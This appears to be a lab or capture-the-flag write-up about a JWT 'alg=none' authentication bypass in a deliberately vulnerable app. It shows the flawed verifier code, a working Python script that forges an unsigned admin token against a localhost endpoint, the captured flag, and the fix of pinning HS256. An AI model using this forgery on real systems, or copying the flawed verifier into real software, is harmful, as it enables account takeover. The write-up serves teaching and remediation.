# A07:2021 - Identification and Authentication Failures (JWT `alg=none`)

**Endpoint:** `GET /a07/admin/flag`
**Severity:** Critical

## Vulnerability

`/a07/login` issues a properly signed HS256 JWT. The verifier, however,
trusts the algorithm named in the **attacker-controlled** token header
instead of pinning one expected algorithm:

```python
# app/challenges/a07_authfail.py
header = jwt.get_unverified_header(token)
alg = header.get("alg")

if alg == "none":
    payload = jwt.decode(token, options={"verify_signature": False})
else:
    payload = jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=[alg])
```

If `alg` is `"none"`, PyJWT is explicitly told to skip signature
verification. A token with `alg: none` and an empty signature segment is
accepted as-is — the payload can claim anything, including `role: admin`.

Bonus finding (not separately flagged, but worth fixing alongside this):
`/a07/login` has no rate limiting or lockout, so it's also brute-forceable.

## Reproduce

```python
import base64, json, requests

def b64url(obj):
    raw = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

header = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"username": "alice", "role": "admin"})
forged = f"{header}.{payload}."

r = requests.get(
    "http://localhost:5000/a07/admin/flag",
    headers={"Authorization": f"Bearer {forged}"},
)
print(r.json())
```

```json
{"flag": "FLAG{jwt_alg_none_bypass}"}
```

Note `alice` is a real, non-admin account in this app (see
`app/models.py`) — no signing key was ever needed to escalate her to admin.

## Impact

Full authentication bypass / privilege escalation without ever knowing
`SECRET_KEY`. Anyone can forge a token for any user or role.

## Fix

Never derive the verification algorithm from the token itself. Pin it
explicitly and reject anything else:

```python
payload = jwt.decode(token, current_app.config["SECRET_KEY"], algorithms=["HS256"])
```

`algorithms=["HS256"]` alone (PyJWT's normal, documented usage) closes this
— PyJWT will reject an `alg: none` token outright when a fixed algorithm
list is required for verification.

## Reference

[OWASP Top 10 2021 - A07 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
